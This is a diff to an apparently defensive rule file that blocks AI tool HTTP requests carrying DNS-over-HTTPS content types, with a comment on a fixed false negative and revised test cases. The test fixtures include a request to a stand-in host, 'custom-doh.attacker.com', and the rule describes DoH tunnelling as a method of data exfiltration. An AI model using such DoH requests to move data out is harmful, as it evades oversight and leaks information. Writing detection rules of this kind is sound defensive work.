@@ -465,6 +465,13 @@ structural_rules:
   # regardless of the destination hostname. Catches custom DoH servers and
   # self-hosted resolver endpoints not covered by the hostname allowlist above.
   # MITRE T1071.004, T1048.003
+  #
+  # The original version required BOTH a `headers` dict AND a top-level `accept`
+  # arg to match — a real FN (issue #1168) since `args_match` is AND across
+  # fields and production MCP HTTP tools pass headers one way OR the other,
+  # never both. Dropped the top-level `accept` check; the authoritative carrier
+  # is the HTTP headers map, which every production MCP HTTP tool (fetch,
+  # http_request, web_fetch, etc.) passes as a `headers` dict.
   - id: mcp-data-exfil-block-doh-content-type
     match:
       tool_name_any:
@@ -482,19 +489,15 @@ structural_rules:
           pattern_any:
             - "(?i)application/dns-json"
             - "(?i)application/dns-message"
-        accept:
-          pattern_any:
-            - "(?i)application/dns-json"
-            - "(?i)application/dns-message"
     decision: "BLOCK"
-    reason: "MCP HTTP tool request using DNS-over-HTTPS wire format content type (application/dns-json or application/dns-message) — indicates a DoH resolver call regardless of destination, used to exfiltrate data as DNS queries tunneled through HTTPS. MITRE T1071.004, T1048.003."
+    reason: "MCP HTTP tool request with DNS-over-HTTPS wire format content type (application/dns-json or application/dns-message) in headers — indicates a DoH resolver call regardless of destination, used to exfiltrate data as DNS queries tunneled through HTTPS. MITRE T1071.004, T1048.003."
     confidence: 0.93
     tests:
       tp:
         - tool: "http_request"
           args: {"url": "https://custom-doh.attacker.com/dns", "headers": {"accept": "application/dns-json"}}
-        - tool: "fetch_url"
-          args: {"url": "https://resolver.example.com/query", "accept": "application/dns-message"}
+        - tool: "http_post"
+          args: {"url": "https://resolver.example.com/query", "headers": {"Content-Type": "application/dns-message"}}
       tn:
         - tool: "http_request"
           args: {"url": "https://api.github.com/repos/owner/repo", "headers": {"accept": "application/json"}}
